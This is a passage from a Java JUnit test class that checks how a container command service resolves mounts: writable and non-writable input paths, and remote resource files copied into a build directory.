    public void testWritableInputPath() throws Exception {
        runMountTest("command-writable-mount", true);
    }

    @Test
    public void testNonWritableInputPath() throws Exception {
        runMountTest("command", false);
    }

    @Test
    public void testRemoteFilesMount() throws Exception {
        when(catalogService.hasRemoteFiles(eq(userI), any(String.class))).thenReturn(true);

        // Just copy the archive dir over for now (tests for pullResourceCatalogsToDestination in xnat-web and filesystems_plugin)
        doAnswer(inv -> {
            String src = inv.getArgumentAt(2, String.class);
            String dest = inv.getArgumentAt(3, String.class);
            FileUtils.copyDirectory(new File(src), new File(dest));
            return null;
        }).when(catalogService).pullResourceCatalogsToDestination(eq(userI),
                any(String.class), any(String.class), any(String.class));

        runMountTest("command", true);
    }

    private void runMountTest(final String commandFileName, final boolean buildDirMount) throws Exception{
        final String testResourceDir = Paths.get(ClassLoader.getSystemResource("commandResolutionTest/mountTests")
                .toURI()).toString().replace("%20", " ");
        final String commandJsonFile = testResourceDir + "/" + commandFileName + ".json";
        final Command command = mapper.readValue(new File(commandJsonFile), Command.class);
        final CommandWrapper wrapper = wrapperByName(command, "resource-wrapper");
        final Command.ConfiguredCommand configuredCommand = configure(command, wrapper);

        final Path inputPath = Paths.get(testResourceDir, "resource.json");
        final String archiveDir = Paths.get(testResourceDir, "data").toString();

        final Resource resource = mapper.readValue(inputPath.toFile(), Resource.class);
        resource.setDirectory(archiveDir);

        final Map<String, String> runtimeValues = Collections.singletonMap("resource", mapper.writeValueAsString(resource));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);

        assertThat(resolvedCommand.mounts(), Matchers.hasSize(1));

        final ResolvedCommandMount resolvedMount = resolvedCommand.mounts().get(0);
        assertThat(resolvedMount.containerPath(), is(command.mounts().get(0).path()));

        final String mountedDir = resolvedMount.containerHostPath();

        if (buildDirMount) {
            final String pattern = buildDir + File.separator + buildDirPattern;
            assertThat("Path \"" + mountedDir + "\" did not match " + pattern,
                    mountedDir.matches(pattern),
                    is(true));
        }

        final File hello1File = Paths.get(mountedDir, HELLO_1).toFile();
        assertThat("File " + HELLO_1 + " does not exist in build dir", hello1File.exists(), is(true));

        final File hello2File = Paths.get(mountedDir).resolve(HELLO_2_RELATIVE).toFile();
        assertThat("File " + HELLO_2_RELATIVE + " does not exist in build dir", hello2File.exists(), is(true));
    }
}
